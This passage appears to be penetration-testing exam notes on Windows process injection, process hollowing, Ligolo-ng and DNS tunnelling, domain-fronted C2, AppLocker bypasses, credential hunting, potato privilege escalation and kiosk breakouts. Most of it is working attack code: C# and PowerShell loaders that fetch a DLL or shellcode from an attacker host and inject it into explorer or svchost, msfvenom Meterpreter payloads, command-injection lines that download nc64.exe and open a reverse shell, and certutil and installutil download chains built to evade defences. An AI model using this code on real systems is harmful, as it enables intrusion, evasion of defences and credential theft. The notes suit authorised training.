        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
            string dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string dllName = dir + "\\met.dll";

            new WebClient().DownloadFile("http://[attacker-ip]/met.dll", dllName);

            int pid = Process.GetProcessesByName("explorer")[0].Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }
    }
}

3.5.3 Reflective DLL Injection

Avoid the disk write of plain DLL injection by parsing the DLL's PE format and mapping it into memory manually — also keeps it invisible to Process Explorer's loaded-DLL list. Reuse Joe Bialek / Matt Graeber's Invoke-ReflectivePEInjection.ps1, supplying the DLL as a byte array (-PEBytes) and the target PID (-ProcId).

PowerShell -Exec Bypass
$bytes = (New-Object System.Net.WebClient).DownloadData('http://[attacker-ip]/met.dll')
$procid = (Get-Process -Name explorer).Id
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid

The VoidFunc couldn't be found in the DLL error is harmless. The public script fails on Windows 10 1803+ due to duplicate GetProcAddress entries in UnsafeNativeMethods — use a patched copy.

3.5.4 Process Hollowing

Spawn a trusted process (svchost.exe) suspended, overwrite its EntryPoint with shellcode before it runs, then resume it. This lets you hide in a process that normally generates network traffic and would otherwise terminate if injected into after start. Steps:

  • Create the process with CreateProcessW and the CREATE_SUSPENDED flag (0x4) — high-level Process.Start cannot do this.
  • ZwQueryInformationProcess (class 0 = ProcessBasicInformation) returns the PEB address; the image base is at PEB+0x10.
  • ReadProcessMemory the base, then the first 0x200 bytes; e_lfanew at 0x3C gives the PE header offset, EntryPoint RVA is at PE header + 0x28.
  • WriteProcessMemory shellcode to base + RVA, then ResumeThread on the suspended main thread.
using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace Hollow
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb; public IntPtr lpReserved; public IntPtr lpDesktop; public IntPtr lpTitle;
            public Int32 dwX; public Int32 dwY; public Int32 dwXSize; public Int32 dwYSize;
            public Int32 dwXCountChars; public Int32 dwYCountChars; public Int32 dwFillAttribute; public Int32 dwFlags;
            public Int16 wShowWindow; public Int16 cbReserved2; public IntPtr lpReserved2;
            public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1; public IntPtr PebAddress; public IntPtr Reserved2;
            public IntPtr Reserved3; public IntPtr UniquePid; public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // 0x4 = CREATE_SUSPENDED
            CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            // PEB via ZwQueryInformationProcess (class 0); image base lives at PEB+0x10
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            // Read the EXE base address (8 bytes on x64)
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            // Read the first 0x200 bytes and parse the PE header for the EntryPoint
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);   // offset to PE header
            uint opthdr = e_lfanew_offset + 0x28;                       // AddressOfEntryPoint field
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ip] LPORT=443 -f csharp
            byte[] buf = new byte[659] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8, /* ... */ 0xff,0xd5 };

            // Overwrite the EntryPoint, then resume the suspended thread
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
            ResumeThread(pi.hThread);
        }
    }
}

4. Tunneling

Tool Mechanism OS Support Requires Agent on Victim Multi-hop Notes
Ligolo-ng TUN interface (layer-3 VPN) Win / Lin / Mac Yes (agent.exe) Yes (double/triple pivot) Fastest; full routing; AV-bypass variants available
Metasploit autoroute + SOCKS SOCKS4a proxy via Meterpreter Win / Lin Yes (Meterpreter session) Chained routes No extra binary; proxychains required for most tools
sshuttle SSH + iptables transparent proxy Lin / Mac (attacker) SSH access only Via proxychains No agent; great for web services; Linux attacker only

4.1 Ligolo-ng

4.1.1 Normal Instructions

3.1.1.1 Simple Tunneling

Deploy the proxy on the attacker and the agent on the victim, then follow these steps.

# 1. Create the ligolo TUN interface on Kali
sudo ip tuntap add user [kali_user] mode tun ligolo
sudo ip link set ligolo up

# 2. Start the proxy on the attacker (-selfcert = plaintext, fine for exam)
./ligolo_proxy_linux -selfcert
# or on a non-default port:
./ligolo_proxy_linux -selfcert -port <DIFFERENT_PROXY_PORT>

# 3. Transfer the agent to the victim (Windows example)
iwr -uri http://[attacker_ip]/ligolo_agent_windows.exe -UseBasicParsing -Outfile ligolo_agent_windows.exe

# 4. Connect the agent to the proxy
./ligolo_agent_windows.exe -connect [attacker_ip]:11601 -ignore-cert
# or custom port:
./ligolo_agent_windows.exe -connect [attacker_ip]:<DIFFERENT_PROXY_PORT> -ignore-cert

# 5. Add the route for the internal subnet (separate terminal from proxy)
sudo ip route add [internal_subnet]/24 dev ligolo
ip route list

# 6. Activate the session in the ligolo proxy terminal
» session
» start
3.1.1.2 Reverse Shells From Internal Networks
# 1. Listener on Kali
nc -nvlp [kali_port]

# 2. Redirect agent port → Kali listener in Ligolo session
listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp

# 3. Trigger the reverse shell from the internal host
[command_to_run_reverse_shell] -L [kali_ip]:[kali_port]
# or execute a pre-built payload:
./payload.exe
3.1.1.3 Double Tunneling

When the pivot host has two interfaces, chain a second Ligolo session to reach deeper networks.

# 1. Create a second TUN interface on Kali
sudo ip tuntap add user [kali_user] mode tun ligolo_double
sudo ip link set ligolo_double up

# 2. Forward the Ligolo control port through the first session
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
listener_list

# 3. Run the agent on the second pivot, connecting via the first pivot's IP
./agent.exe -connect [first_pivot_ip]:11601 -ignore-cert

# 4. Add a route for the newly discovered network, then select the second session and start
sudo ip route add [new_network]/24 dev ligolo_double
» session   # choose the second pivot
» start

Repeat the same pattern for a triple pivot.

3.1.1.4 Local Port Forwarding

Ligolo-ng uses the reserved address 240.0.0.1 to expose localhost-only services on the victim.

# Requires an active Ligolo tunnel; add the special route once
sudo ip route add 240.0.0.1/32 dev ligolo

# Access victim-local services via 240.0.0.1
nmap 240.0.0.1 -sV
3.1.1.5 File Transfers From Internal Networks
# 1. Forward agent port → Kali HTTP server port
listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp

# 2. Host the file on Kali
python3 -m http.server [kali_port]

# 3. Download on the internal Windows host
Invoke-WebRequest -Uri "http://[agent_ip]:[agent_port]/[file_name]" -OutFile [file_name]

4.1.2 AV Bypassing

3.1.2.1 Agent AppLocker Bypass
  • ApplockerBypassExternalBinary – GitHub
# 1. Hardcode the attacker IP in /ligolo-ng/cmd/agent/main.go, then cross-compile
GOOS=windows go build -o agent.exe cmd/agent/main.go

# 2. Build ApplockerBypassExternalBinary (Release / x64), then base64-encode it
certutil -encode .\ApplockerBypassExternalBinary.exe AppLockerBypassLigolo.txt

# 3a. Deploy via curl: rename agent.exe → ligolo-agent.exe first
cmd.exe /c "curl http://[attacker_ip]/ligolo-agent.exe -o C:\users\public\try-agent.exe && curl http://[attacker_ip]/AppLockerBypassLigolo.txt -o C:\users\public\enc.txt && certutil -decode C:\users\public\enc.txt C:\users\public\ligolo.exe && del C:\users\public\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=true /U C:\users\public\ligolo.exe"

# 3b. Deploy via bitsadmin
cmd.exe /c "bitsadmin /Transfer myJob http://[attacker_ip]/ligolo-agent.exe C:\users\public\try-agent.exe && cmd /c bitsadmin /Transfer myJob http://[attacker_ip]/pyhttp/AppLockerBypassLigolo.txt C:\users\public\enc.txt && certutil -decode C:\users\public\enc.txt C:\users\public\ligolo.exe && del C:\users\public\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=true /U C:\users\public\ligolo.exe"
3.1.2.2 Agent CLM Bypass
  • OSEP toolkit – GitHub
  • Edit ligolo.ps1 line 14 – set attacker IP.
  • Edit ligolo-clmbypass.xml line 36 – set attacker IP.
# Execute via MSBuild (bypasses CLM / AppLocker)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe ligolo-clmbypass.xml

If ligolo.ps1 is caught by AV, substitute ligolo-psrunner.ps1 (NT APIs only, with sleep jitter).

3.1.2.3 Agent Shellcode Runner
  • OSEP toolkit – GitHub
  • Requirements: agent.exe, ligolo.ps1, and a 64-bit process ([Environment]::Is64BitProcess → True or PROCESSOR_ARCHITECTURE=AMD64).
# 1. Convert agent.exe → shellcode blob (on Kali)
donut -f 1 -o agent.bin -a 2 -p "-connect [attacker_ip]:11601 -ignore-cert" -i agent.exe
  • Update ligolo.ps1 line 14 with attacker IP (use ligolo-psrunner.ps1 if AV flags it).
# 2. Load and execute shellcode in memory on victim
iex(iwr http://[attacker_ip]/ligolo.ps1 -UseBasicParsing)

# Route any tool through the tunnel
proxychains4 -q netexec mssql [target] -u '[user]' -p '[password]'

4.3 sshuttle

# Basic transparent tunnel (no proxychains needed for most TCP tools)
sshuttle -r [user]@[ssh_server] --ssh-cmd "ssh -i [id_rsa]" [internal_subnet]/24

# Tunnel via an intermediate hop with proxychains (reach internal web services etc.)
proxychains sshuttle -v -e "ssh -i id_rsa" -r [user]@[ssh_server] [internal_subnet]/24

# Example: command injection reverse shell once the internal web service is reachable
127.0.0.1 && curl http://[attacker_ip]/nc64.exe -O c:\windows\tasks\nc64.exe
127.0.0.1 && c:\windows\tasks\nc64.exe [attacker_ip] 80 -e cmd.exe

4.4 Domain Fronting

Route C2 through a large CDN so the connection appears to target an allowed, well-known domain while content is fetched from a different, blocked origin.

  • The TLS SNI (sent in the Client Hello) and the HTTP Host header are processed independently — set SNI to a trusted frontable domain, set Host to your CDN endpoint.
  • Front and origin must live on the same CDN (e.g. both behind azureedge.net); the CDN routes by Host after terminating TLS.
  • Without HTTPS inspection, a proxy only sees the SNI/DNS for the trusted domain — bypassing DNS, proxy, and IDS filters at once.
  • Some providers (Google, Amazon) reject SNI/Host mismatches; Azure Verizon-tier CDN allows them. Disable CDN caching or it breaks the dynamic C2 channel.
# Find frontable domains sharing the target CDN (azureedge.net etc.)
git clone https://github.com/rvrsh3ll/FindFrontableDomains
python3 FindFrontableDomains.py --domain skype.com

# Validate a candidate front: SNI = trusted domain, Host = your CDN endpoint
curl --header "Host: [cdn-endpoint].azureedge.net" https://[frontable-domain]

# Stageless reverse_https payload — LHOST = front, HttpHostHeader = CDN endpoint
msfvenom -p windows/x64/meterpreter_reverse_https \
  LHOST=[frontable-domain] LPORT=443 \
  HttpHostHeader=[cdn-endpoint].azureedge.net \
  -f exe > https-df.exe

# Staged reverse_http needs OverrideLHOST/OverrideRequestHost so stage 2 also fronts
msfvenom -p windows/x64/meterpreter/reverse_http \
  LHOST=[frontable-domain] LPORT=80 \
  HttpHostHeader=[cdn-endpoint].azureedge.net \
  -f exe > http-df.exe

# multi/handler — bind error to the front's real IP is expected (falls back to 0.0.0.0)
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_http
set LHOST [frontable-domain]
set LPORT 80
set HttpHostHeader [cdn-endpoint].azureedge.net
# staged payloads only — force stage 2 through the front:
set OverrideLHOST [frontable-domain]
set OverrideRequestHost true
run -j

# Lab CDN emulation: NGINX reverse-proxies the "front" host to the blocked origin
server {
  listen 443 ssl;
  server_name [cdn-endpoint].offseccdn.com;
  ssl_certificate     cdn.crt;
  ssl_certificate_key cdn.key;
  location / {
    proxy_pass https://[blocked-domain];
    proxy_ssl_verify off;
  }
}

4.5 DNS Tunneling

Encapsulate C2 data in DNS queries/responses to escape restrictive egress filters — slow, but DNS is almost always allowed. Requires control of an authoritative name server: set the target domain's NS record to your tunnel server so all subdomain lookups are forwarded to it.

# Authoritative-server emulation in lab: forward a domain to the tunnel server (dnsmasq)
# /etc/dnsmasq.conf
server=/[tunnel-domain]/[attacker-ip]
# then: sudo systemctl restart dnsmasq

# dnscat2 server (Kali) — prints the client command and a --secret pre-shared key
sudo apt install dnscat2
dnscat2-server [tunnel-domain]

# dnscat2 client (Windows victim) — uses A/TXT/CNAME/MX records, no admin needed
dnscat2-v0.07-client-win32.exe [tunnel-domain]

# dnscat2 server console: attach, drop to a shell, or tunnel TCP (e.g. RDP) over DNS
session -i 1
shell
listen 127.0.0.1:3389 [victim-ip]:3389

# iodine — full IP-over-DNS tunnel (server then client)
sudo iodined -f -c -P [password] 10.0.0.1 [tunnel-domain]
sudo iodine -f -P [password] [dns-server-ip] [tunnel-domain]
Channel Tool Use Case
HTTPS via CDN (domain fronting) Meterpreter / Empire / Covenant + Azure CDN Bypass DNS/proxy/IDS at once when egress to a trusted CDN domain is allowed
DNS (TXT/CNAME/MX), command + TCP tunnel dnscat2 Encrypted C2, shell, and TCP port-forwarding when only DNS escapes; no client driver
DNS (full IP tunnel) iodine Route arbitrary IP traffic over DNS through a captive/filtered network
HTTPS with custom certificate OpenSSL / impersonate_ssl + HandlerSSLCert Defeat signature-based HIPS that flags Meterpreter's randomized cert fields

5.1.2 Finding Files

Check web roots (C:\inetpub\wwwroot), \Temp, \Tasks, and \Config for hardcoded credentials.

# All files under Users
Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue

# Password manager databases
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Sensitive config in XAMPP
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

# Backup / temp files
Get-ChildItem -Path C:\Users -Include *.bak,*.old,*.tmp -File -Recurse -ErrorAction SilentlyContinue

# Executables
Get-ChildItem -Path C:\Users -Include *.exe,*.bat,*.ps1 -File -Recurse -ErrorAction SilentlyContinue

# Files owned by SYSTEM or Administrators
Get-ChildItem -Path [Path] -File -Recurse | Where-Object {
    (Get-Acl $_.FullName).Access | Where-Object { $_.IdentityReference -like "*SYSTEM*" -or $_.IdentityReference -like "*Administrators*" }
}

# Directories writable by all users
Get-ChildItem -Path [Path] -Directory -Recurse | Where-Object {
    (Get-Acl $_.FullName).Access | Where-Object { $_.FileSystemRights -like "*Write*" -and $_.IdentityReference -like "*Users*" }
}

# Large files
Get-ChildItem -Path [Path] -File -Recurse | Where-Object { $_.Length -gt [SizeInBytes] } | Select-Object FullName, Length

# Run cmd as another user
runas /user:[Domain\Username] cmd

5.1.3 PowerShell Goldmine (logs)

Get-History

(Get-PSReadlineOption).HistorySavePath

# Dump PSReadLine history for every user profile
$userProfiles = Get-ChildItem -Path C:\Users -Directory
foreach ($profile in $userProfiles) {
    $historyPath = Join-Path -Path $profile.FullName -ChildPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $historyPath) {
        Write-Output "User: $($profile.Name)"
        Write-Output "PSReadline History Path: $historyPath"
        Write-Output "--------------------------------"
        Get-Content -Path $historyPath
        Write-Output ""
    }
}

5.1.4 Access Tokens - SeImpersonate

Privileges that allow elevation:

  • SeImpersonatePrivilege / SeAssignPrimaryPrivilege — most common via potato attacks
  • SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege

Potato variant quick-reference:

Tool OS / Context Mechanism Notes
PrintSpoofer Win 10 / Server 2016-2019 Named-pipe impersonation via Print Spooler Preferred for modern targets
SigmaPotato Win 10+ / .NET reflection COM-based impersonation, memory-loaded No disk drop required
RoguePotato Win 10 / Server 2016-2019 Fake OXID resolver + named pipe JuicyPotato successor
JuicyPotato Win 7–10 / Server 2008-2016 DCOM/CLSID token relay Needs specific CLSID; blocked on newer OS
GodPotato Win 8–11 / Server 2012-2022 ImpersonateNamedPipeClient via RPC Broad OS coverage
FullPowers Any (service account context) Recovers stripped default service privileges Use first if privileges are missing

4.1.4.3.2 SpoolSample Modified - PS Reverse Shell Loader

SpoolSampleModified combines SharpPrintSpoofer functionality — one binary handles the full escalation.

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=443 -f csharp EXITFUNC=thread

# hollow.ps1 — XOR shellcode (key 0xfa) then inject via process hollowing into svchost.exe
# Shellcode should be XOR'd with key: 0xfa
[Byte[]] $SHELLCODE = 0x06,0xB2...

$key = 0xfa
for ($i = 0; $i -lt $SHELLCODE.Length; $i++) {
    $SHELLCODE[$i] = $SHELLCODE[$i] -bxor $key
}

filter Get-Type ([string]$dllName,[string]$typeName)
{
    if( $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($dllName) )
    {
        $_.GetType($typeName)
    }
}

function Get-Function
{
    Param(
        [string] $module,
        [string] $function
    )

    if( ($null -eq $GetModuleHandle) -or ($null -eq $GetProcAddress) )
    {
        throw "Error: GetModuleHandle and GetProcAddress must be initialized first!"
    }

    $moduleHandle = $GetModuleHandle.Invoke($null, @($module))
    $GetProcAddress.Invoke($null, @($moduleHandle, $function))
}

function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
        [Parameter(Position = 2)] [Type] $retType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()

    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
}

$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
$unsafeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.UnsafeNativeMethods'
$nativeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods'
$startupInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods+STARTUPINFO'
$processInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION'

$GetModuleHandle = $unsafeMethodsType.GetMethod('GetModuleHandle')
$GetProcAddress = $unsafeMethodsType.GetMethod('GetProcAddress', [reflection.bindingflags]'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null);
$CreateProcess = $nativeMethodsType.GetMethod("CreateProcess")

$ResumeThreadAddr = Get-Function "kernel32.dll" "ResumeThread"
$ReadProcessMemoryAddr = Get-Function "kernel32.dll" "ReadProcessMemory"
$WriteProcessMemoryAddr = Get-Function "kernel32.dll" "WriteProcessMemory"
$ZwQueryInformationProcessAddr = Get-Function "ntdll.dll" "ZwQueryInformationProcess"

$ResumeThread = Get-Delegate $ResumeThreadAddr @([IntPtr])
$WriteProcessMemory = Get-Delegate $WriteProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int32], [IntPtr])
$ReadProcessMemory = Get-Delegate $ReadProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool])
$ZwQueryInformationProcess = Get-Delegate $ZwQueryInformationProcessAddr @([IntPtr], [Int], [Byte[]], [UInt32], [UInt32]) ([Int])

$startupInformation = $startupInformationType.GetConstructors().Invoke($null)
$processInformation = $processInformationType.GetConstructors().Invoke($null)

$cmd = [System.Text.StringBuilder]::new("C:\\Windows\\System32\\svchost.exe")
$CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $null, $startupInformation, $processInformation))

$hThread = $processInformation.hThread
$hProcess = $processInformation.hProcess

$processBasicInformation = [System.Byte[]]::CreateInstance([System.Byte], 48)
$ZwQueryInformationProcess.Invoke($hProcess, 0, $processBasicInformation, $processBasicInformation.Length, 0)

$imageBaseAddrPEB = ([IntPtr]::new([BitConverter]::ToUInt64($processBasicInformation, 0x08) + 0x10))

$memoryBuffer = [System.Byte[]]::CreateInstance([System.Byte], 0x200)
$ReadProcessMemory.Invoke($hProcess, $imageBaseAddrPEB, $memoryBuffer, 0x08, 0)

$imageBaseAddr = [BitConverter]::ToInt64($memoryBuffer, 0)
$imageBaseAddrPointer = [IntPtr]::new($imageBaseAddr)

$ReadProcessMemory.Invoke($hProcess, $imageBaseAddrPointer, $memoryBuffer, $memoryBuffer.Length, 0)

$peOffset = [BitConverter]::ToUInt32($memoryBuffer, 0x3c)
$entryPointAddrRelative = [BitConverter]::ToUInt32($memoryBuffer, $peOffset + 0x28)
$entryPointAddr = [IntPtr]::new($imageBaseAddr + $entryPointAddrRelative)

$WriteProcessMemory.Invoke($hProcess, $entryPointAddr, $SHELLCODE, $SHELLCODE.Length, [IntPtr]::Zero)
$ResumeThread.Invoke($hThread)

exit

sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost [ATTACKER_IP]; set lport 443; exploit"

SpoolSampleModified.exe [HOSTNAME] [HOSTNAME]/pipe/test "C:\Windows\System32\cmd.exe /c powershell iex(iwr http://[ATTACKER_IP]/hollow.ps1 -useb)"

5.1.7 Kiosk Breakouts

Kiosks and thin clients are a restrictive veneer over a full OS; escape the guided experience by misusing native functionality, then use that back-end access. Live off the land — LOLBAS (Windows) and GTFOBins (Linux).

4.1.7.1 Kiosk Enumeration

Map the locked-down interface first: what app is exposed, which inputs accept text, and which keyboard/mouse combinations are not blocked.

  • Try right-, middle-, and left-click combined with letter/function keys on links, icons, and menu items.
  • Hunt for any text input (address bar, search box, contact form, print/save dialog) — these are the breakout surface.
  • A file:// home page URL means content is local; trim the filename to get a directory listing.
# Useful escape/task-switch hotkeys to probe in the kiosk
Alt+Tab        # switch tasks — reveals other running apps
Ctrl+Alt+F3    # virtual terminal (TTY) switch (Linux)
Ctrl+Alt+Del   # lock screen / Task Manager (Windows)
Ctrl+Alt+~     # Task Manager directly (Windows)
Win+R          # Run menu (Windows)

# Probe Firefox address bar — internal keywords and local browsing
about:config
about:preferences
file:///var/www/localhost/        # trim index.html for a directory listing
file:///etc/passwd                # valid login users (shell in last column)
file:///proc/version             # kernel version — gauge kernel-exploit viability
file:///home/[user]/.ssh/        # hunt for private keys

# Probe alternate URI schemes — a handler prompt is the first crack
irc://myhost      # often pops a "Launch Application" dialog
ftp://  smb://  mailto:  chrome://   # frequently filtered, but worth testing
4.1.7.2 Command Execution

Turn a protocol-handler or file dialog into program launch. Do NOT tick "Remember my choice" — that locks you out of choosing new handlers.

# The URI is passed as argv[1] to the chosen handler, e.g. firefox runs:  handler irc://myhost
# Pick a GUI program that tolerates that argument (a CLI shell needs a terminal emulator, usually absent)
/usr/bin/dunstify       # confirms external apps run + that the URI is argv[1]
/usr/bin/firefox        # Firefox accepts a URI as argv[1] — and its own flags

# Negate the leading URI argument with env, then run the real target
/usr/bin/env irc://myhost=x /bin/bash

# Break out of the restricted Firefox profile into a full browser instance
irc://myhost -P "haxor"     # launch /usr/bin/firefox -> profile manager -> create profile

Use the unrestricted browser (Scratchpad / dev tools) to write files, then drive command execution with gtkdialog, which builds GUIs from markup and runs shell commands on button actions.

# Save markup with Scratchpad (set "All Files"), then launch via the handler dialog:
irc://myhost -f /home/[user]/mywindow

<window>
  <vbox>
    <frame Description>
      <text><label>This is an example window.</label></text>
    </frame>
    <hbox>
      <button ok>
        <action>echo "testing gtk" > /tmp/gtkoutput.txt</action>
      </button>
      <button cancel></button>
    </hbox>
  </vbox>
</window>
Vector Trigger Result
Protocol handler dialog irc://myhost in address bar "Launch Application" prompt to choose any local binary
Argument negation /usr/bin/env irc://myhost=x /bin/bash Cancels the forced argv[1] URI and runs target program
Firefox profile swap irc://myhost -P "haxor" via /usr/bin/firefox Unrestricted browser with full menus / dev tools
gtkdialog markup irc://myhost -f /home/[user]/mywindow Button action executes arbitrary shell commands
file:// URI file:///etc/passwd, directory trims Read-only filesystem enumeration
Windows env vars / UNC %APPDATA%, \\127.0.0.1\C$\Windows\System32\ Reach paths the kiosk blocks directly
shell: shortcuts shell:System, shell:Downloads, shell:MyComputerFolder Open special folders inside file dialogs
Help / search dialog Search "Notepad", "cmd", "PowerShell"; click embedded link Launch an interactive program from results
Print / Save-As / Open dialog Invoke Ctrl+P or a save dialog Full file browser to navigate and launch binaries
Shortcut creation Right-click file → Create shortcut, edit target Point shortcut at cmd.exe / powershell.exe
Drag-and-drop Drop any file onto cmd.exe / powershell.exe Opens a command window when right-click is disabled
Whitelist / blacklist bypass Copy + rename powershell.exe, or replace a whitelisted file Run a restricted binary (defeats name/hash/path rules)
4.1.7.3 Post-Exploitation & Privilege Escalation

Build a usable shell, then abuse a root-owned refresh process to write into privileged directories.

<!-- Pseudo-terminal in gtkdialog: entry runs a command, edit shows output -->
<window>
  <vbox>
    <vbox scrollable="true" width="500" height="400">
      <edit>
        <variable>CMDOUTPUT</variable>
        <input file>/tmp/termout.txt</input file>
      </edit>
    </vbox>
    <hbox>
      <text><label>Command:</label></text>
      <entry><variable>CMDTORUN</variable></entry>
      <button>
        <label>Run!</label>
        <action>$CMDTORUN > /tmp/termout.txt</action>
        <action>refresh:CMDOUTPUT</action>
      </button>
    </hbox>
  </vbox>
</window>

# Local enumeration (g0tmi1k methodology)
find / -perm -u=s -exec ls -al {} +    # SUID binaries
ps aux | grep root                     # root-owned processes (e.g. openbox WM)

The window manager (openbox) is launched by root and rebuilds the guest Firefox profile on restart. Replace the profile dir with a symlink so the privileged refresh writes where guest cannot.

  • Symlinking the whole profile directory (not the file) redirects the privileged write into a protected path.
  • You own the resulting file (can chmod +x) but cannot rename it — filename stays bookmarks.html.
# Redirect the root-run refresh into a privileged directory
mv /home/[user]/.mozilla/firefox/[profile].default /home/[user]/.mozilla/firefox/old_prof
ln -s /usr/bin /home/[user]/.mozilla/firefox/[profile].default
openbox --replace      # restart X session -> bookmarks.html now written under /usr/bin

